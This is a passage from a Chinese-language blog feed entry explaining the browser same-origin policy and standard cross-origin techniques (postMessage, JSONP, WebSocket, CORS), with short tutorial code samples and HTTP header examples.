  if (event.origin !== &apos;http://aaa.com&apos;) return;
  if (event.data === &apos;Hello World&apos;) {
      event.source.postMessage(&apos;Hello&apos;, event.origin);
  } else {
    console.log(event.data);
  }
}
</code></pre><h2 id="Ajax跨域"><a href="#Ajax跨域" class="headerlink" title="Ajax跨域"></a>Ajax跨域</h2><p>同源政策规定，AJAX请求只能发给同源的网址。</p>
<p>除了架设服务器代理（浏览器请求同源服务器，再由后者请求外部服务），有三种方法规避这个限制。</p>
<ul>
<li>JSONP</li>
<li>WebSocket</li>
<li>CORS</li>
</ul>
<h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p>JSONP是服务器与客户端跨源通信的常用方法。最大特点就是简单适用，老式浏览器全部支持，服务器改造非常小。</p>
<p>它的基本思想是，网页通过添加一个<code>&lt;script&gt;</code>元素，向服务器请求JSON数据，这种做法不受同源政策限制；服务器收到请求后，将数据放在一个指定名字的回调函数里传回来。</p>
<p>举个例子</p>
<pre><code>function addScriptTag(src) {
  var script = document.createElement(&apos;script&apos;);
  script.setAttribute(&quot;type&quot;,&quot;text/javascript&quot;);
  script.src = src;
  document.body.appendChild(script);
}

window.onload = function () {
  addScriptTag(&apos;http://example.com/ip?callback=foo&apos;);
}

function foo(data) {
  console.log(&apos;Your public IP address is: &apos; + data.ip);
};
</code></pre><p>上面代码通过动态添加<code>&lt;script&gt;</code>元素，向服务器<code>example.com</code>发出请求。</p>
<blockquote>
<p>注意：该请求的查询字符串有一个<code>callback</code>参数（在服务器中须对其进行相关声明和定义），用来指定回调函数的名字，这对于JSONP是必需的。假设目标返回的数据是<code>[&quot;customername1&quot;,&quot;customername2&quot;]</code>那么真正返回到客户端的数据为<code>foo([&quot;customername1&quot;,&quot;customername2&quot;])</code></p>
</blockquote>
<p>服务器收到这个请求以后，会将数据放在回调函数的参数位置返回。</p>
<p>由于<code>&lt;script&gt;</code>元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了<code>foo</code>函数，该函数就会立即调用。作为参数的JSON数据被视为JavaScript对象，而不是字符串，因此避免了使用<code>JSON.parse</code>的步骤。</p>
<h3 id="WebSocket跨域"><a href="#WebSocket跨域" class="headerlink" title="WebSocket跨域"></a>WebSocket跨域</h3><p>WebSocket是一种通信协议，使用<code>ws://</code>（非加密）和<code>wss://</code>（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。</p>
<p>下面是一个例子，浏览器发出的WebSocket请求的头信息</p>
<pre><code>GET /chat HTTP/1.1
Host: server.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==
Sec-WebSocket-Protocol: chat, superchat
Sec-WebSocket-Version: 13
Origin: http://example.com
</code></pre><p>上面代码中，有一个字段是Origin，表示该请求的请求源（origin），即发自哪个域名。</p>
<p>正是因为有了<code>Origin</code>这个字段，所以WebSocket才没有实行同源政策。因为服务器可以根据这个字段，判断是否许可本次通信。如果该域名在白名单内，服务器就会做出如下回应。</p>
<pre><code>HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=
Sec-WebSocket-Protocol: chat
</code></pre><h3 id="CORS跨域"><a href="#CORS跨域" class="headerlink" title="CORS跨域"></a>CORS跨域</h3><p>跨源资源分享（Cross-Origin Resource Sharing）</p>
<p>它是W3C标准，是跨源AJAX请求的根本解决方法。</p>
<p>相比JSONP只能发GET请求，CORS允许任何类型的请求。</p>
<p><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="external">CORS跨域详细</a></p>
<hr>
<p>参考链接</p>
<ul>
<li><a href="http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html" target="_blank" rel="external">浏览器同源政策及其规避方法</a></li>
<li><a href="http://www.cnblogs.com/rainman/archive/2011/02/20/1959325.html" target="_blank" rel="external">JavaScript跨域总结与解决办法</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;同源策略&quot;&gt;&lt;a href=&quot;#同源策略&quot; class=&quot;headerlink&quot; title=&quot;同源策略&quot;&gt;&lt;/a&gt;同源策略&lt;/h2&gt;&lt;h3 id=&quot;同源包括三个相同&quot;&gt;&lt;a href=&quot;#同源包括三个相同&quot; class=&quot;headerlink&quot; title=&quot;同源包括三个相同&quot;&gt;&lt;/a&gt;同源包括三个相同&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;协议（protocol）相同&lt;/li&gt;
&lt;li&gt;域名（domain/host）相同&lt;/li&gt;
&lt;li&gt;端口（port）相同&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="js" scheme="https://jasonyan2015.github.io/tags/js/"/>
    
      <category term="浏览器" scheme="https://jasonyan2015.github.io/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
  </entry>
  
</feed>
